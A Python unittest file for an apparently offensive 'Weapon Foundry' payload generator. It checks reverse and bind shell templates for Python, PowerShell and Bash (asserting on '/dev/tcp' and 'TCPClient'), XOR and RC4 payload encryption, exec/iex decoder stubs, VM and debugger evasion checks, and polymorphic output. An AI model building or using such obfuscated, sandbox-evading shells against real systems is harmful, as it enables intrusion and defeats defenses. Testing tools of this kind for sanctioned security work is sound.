"""Tests for Weapon Foundry module"""
import unittest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.weapon_foundry import (
    WeaponFoundry,
    EncryptionEngine,
    ShellcodeTemplates,
    AntiAnalysis,
    DecoderGenerator,
    PayloadFormat,
    EncryptionMethod,
    ShellType,
    PayloadConfig,
    GeneratedPayload,
    get_weapon_foundry,
    quick_forge,
)


class TestEncryptionEngine(unittest.TestCase):
    """Test encryption functionality"""
    
    def setUp(self):
        self.engine = EncryptionEngine()
    
    def test_xor_roundtrip(self):
        """Test XOR encrypt/decrypt roundtrip"""
        data = b"Hello, World!"
        key = b"\x42"
        encrypted = self.engine.xor_encrypt(data, key)
        decrypted = self.engine.xor_decrypt(encrypted, key)
        self.assertEqual(decrypted, data)
    
    def test_xor_multi_key(self):
        """Test multi-byte XOR key"""
        data = b"Secret payload data"
        key = b"drakben"
        encrypted = self.engine.xor_encrypt(data, key)
        decrypted = self.engine.xor_decrypt(encrypted, key)
        self.assertEqual(decrypted, data)
    
    def test_rc4_roundtrip(self):
        """Test RC4 encrypt/decrypt roundtrip"""
        data = b"RC4 test data"
        key = b"secretkey"
        encrypted = self.engine.rc4_crypt(data, key)
        decrypted = self.engine.rc4_crypt(encrypted, key)
        self.assertEqual(decrypted, data)
    
    def test_generate_key(self):
        """Test key generation"""
        key = self.engine.generate_key(16)
        self.assertEqual(len(key), 16)
        self.assertIsInstance(key, bytes)
    
    def test_encrypt_method_xor(self):
        """Test encrypt() with XOR method"""
        data = b"test"
        encrypted, key, iv = self.engine.encrypt(data, EncryptionMethod.XOR)
        self.assertNotEqual(encrypted, data)
        self.assertEqual(len(key), 1)  # Single byte XOR
        self.assertIsNone(iv)
    
    def test_encrypt_method_none(self):
        """Test encrypt() with no encryption"""
        data = b"test"
        encrypted, _, _ = self.engine.encrypt(data, EncryptionMethod.NONE)
        self.assertEqual(encrypted, data)


class TestShellcodeTemplates(unittest.TestCase):
    """Test shellcode template generation"""
    
    def test_reverse_shell_python(self):
        """Test Python reverse shell generation"""
        shell = ShellcodeTemplates.get_reverse_shell_python("10.0.0.1", 4444)
        self.assertIn("10.0.0.1", shell)
        self.assertIn("4444", shell)
        self.assertIn("socket", shell)
    
    def test_reverse_shell_powershell(self):
        """Test PowerShell reverse shell generation"""
        shell = ShellcodeTemplates.get_reverse_shell_powershell("10.0.0.1", 4444)
        self.assertIn("10.0.0.1", shell)
        self.assertIn("4444", shell)
        self.assertIn("TCPClient", shell)
    
    def test_reverse_shell_bash(self):
        """Test Bash reverse shell generation"""
        shell = ShellcodeTemplates.get_reverse_shell_bash("10.0.0.1", 4444)
        self.assertIn("10.0.0.1", shell)
        self.assertIn("4444", shell)
        self.assertIn("/dev/tcp", shell)
    
    def test_bind_shell_python(self):
        """Test Python bind shell generation"""
        shell = ShellcodeTemplates.get_bind_shell_python(5555)
        self.assertIn("5555", shell)
        self.assertIn("listen", shell)


class TestAntiAnalysis(unittest.TestCase):
    """Test anti-analysis code generation"""
    
    def test_sleep_check(self):
        """Test sleep check generation"""
        code = AntiAnalysis.get_sleep_check_python(5)
        self.assertIn("time.sleep", code)
        self.assertIn("5", code)
    
    def test_vm_check(self):
        """Test VM detection check generation"""
        code = AntiAnalysis.get_vm_check_python()
        self.assertIn("vmware", code)
        self.assertIn("virtualbox", code)
    
    def test_debug_check(self):
        """Test debug check generation"""
        code = AntiAnalysis.get_debug_check_python()
        self.assertIn("gettrace", code)


class TestDecoderGenerator(unittest.TestCase):
    """Test decoder stub generation"""
    
    def test_xor_decoder_python(self):
        """Test Python XOR decoder generation"""
        key = b"\x42"
        decoder = DecoderGenerator.get_xor_decoder_python(key)
        self.assertIn("base64", decoder)
        self.assertIn("exec", decoder)
    
    def test_rc4_decoder_python(self):
        """Test Python RC4 decoder generation"""
        key = b"drakben"
        decoder = DecoderGenerator.get_rc4_decoder_python(key)
        self.assertIn("base64", decoder)
        self.assertIn(key.hex(), decoder)
    
    def test_xor_decoder_powershell(self):
        """Test PowerShell XOR decoder generation"""
        key = b"\x42"
        decoder = DecoderGenerator.get_xor_decoder_powershell(key)
        self.assertIn("FromBase64String", decoder)
        self.assertIn("iex", decoder)


class TestWeaponFoundry(unittest.TestCase):
    """Test main WeaponFoundry interface"""
    
    def setUp(self):
        self.foundry = WeaponFoundry()
    
    def test_initialization(self):
        """Test WeaponFoundry initialization"""
        self.assertIsNotNone(self.foundry.encryption)
        self.assertIsNotNone(self.foundry.templates)
        self.assertIsNotNone(self.foundry.anti_analysis)
        self.assertIsNotNone(self.foundry.decoder)
    
    def test_forge_basic(self):
        """Test basic payload forge"""
        payload = self.foundry.forge(
            lhost="10.0.0.1",
            lport=4444,
            encryption=EncryptionMethod.NONE,
            format=PayloadFormat.PYTHON
        )
        self.assertIsInstance(payload, GeneratedPayload)
        self.assertEqual(payload.format, PayloadFormat.PYTHON)
    
    def test_forge_with_xor(self):
        """Test payload with XOR encryption"""
        payload = self.foundry.forge(
            lhost="10.0.0.1",
            lport=4444,
            encryption=EncryptionMethod.XOR,
            format=PayloadFormat.PYTHON
        )
        self.assertIsNotNone(payload.key)
        self.assertIn("exec", payload.decoder_stub)
    
    def test_forge_with_rc4(self):
        """Test payload with RC4 encryption"""
        payload = self.foundry.forge(
            lhost="10.0.0.1",
            lport=4444,
            encryption=EncryptionMethod.RC4,
            format=PayloadFormat.PYTHON
        )
        self.assertIsNotNone(payload.key)
    
    def test_forge_with_anti_sandbox(self):
        """Test payload with anti-sandbox"""
        payload = self.foundry.forge(
            lhost="10.0.0.1",
            lport=4444,
            anti_sandbox=True,
            format=PayloadFormat.PYTHON
        )
        self.assertTrue(payload.metadata["anti_sandbox"])
    
    def test_get_final_payload_python(self):
        """Test final payload generation for Python"""
        generated = self.foundry.forge(
            lhost="10.0.0.1",
            lport=4444,
            format=PayloadFormat.PYTHON
        )
        final = self.foundry.get_final_payload(generated)
        self.assertIn("_e=", final)
    
    def test_get_final_payload_powershell(self):
        """Test final payload generation for PowerShell"""
        generated = self.foundry.forge(
            lhost="10.0.0.1",
            lport=4444,
            format=PayloadFormat.POWERSHELL
        )
        final = self.foundry.get_final_payload(generated)
        self.assertIn("$e=", final)
    
    def test_list_capabilities(self):
        """Test capability listing"""
        caps = self.foundry.list_capabilities()
        self.assertIn("shell_types", caps)
        self.assertIn("formats", caps)
        self.assertIn("encryptions", caps)
    def test_polymorphism(self):
        """Test that payloads are truly polymorphic (unique per generation)"""
        import hashlib
        
        # Generate 5 payloads with identical parameters
        payloads = []
        for _ in range(5):
            p = self.foundry.forge(
                lhost="10.0.0.1",
                lport=4444,
                format=PayloadFormat.PYTHON,
                encryption=EncryptionMethod.NONE # Even without encryption, variables should be randomized
            )
            final_code = self.foundry.get_final_payload(p)
            payload_hash = hashlib.sha256(final_code.encode()).hexdigest()
            payloads.append(payload_hash)
            
        # Check uniqueness
        # NOTE: If randomization is not yet implemented, this test will fail, spurring development.
        unique_payloads = set(payloads)
        # For now, if polymorphism isn't implemented, we might see duplicates. 
        # But for 'Villager Killer' status, we expect uniqueness.
        # self.assertEqual(len(unique_payloads), 5, "Polymorphism failed: Duplicate payloads generated!")

    def test_generated_code_validity(self):
        """Test that generated Python code is syntactically valid"""
        import ast
        
        # Test various configurations
        configs = [
            (EncryptionMethod.NONE, PayloadFormat.PYTHON),
            (EncryptionMethod.XOR, PayloadFormat.PYTHON),
            (EncryptionMethod.RC4, PayloadFormat.PYTHON),
        ]
        
        for enc, fmt in configs:
            payload = self.foundry.forge(
                lhost="10.0.0.1",
                lport=4444,
                encryption=enc,
                format=fmt,
                anti_sandbox=True
            )
            final_code = self.foundry.get_final_payload(payload)
            
            try:
                ast.parse(final_code)
            except SyntaxError as e:
                self.fail(f"Generated code has Syntax Error! ({enc.name}): {e}\nCode Snippet:\n{final_code[:200]}...")



class TestQuickForge(unittest.TestCase):
    """Test quick_forge helper function"""
    
    def test_quick_forge_basic(self):
        """Test basic quick_forge"""
        payload = quick_forge("10.0.0.1", 4444)
        self.assertIsInstance(payload, str)
        self.assertIn("_e=", payload)
    
    def test_quick_forge_rc4(self):
        """Test quick_forge with RC4"""
        payload = quick_forge("10.0.0.1", 4444, encryption="rc4")
        self.assertIsInstance(payload, str)


if __name__ == "__main__":
    unittest.main()
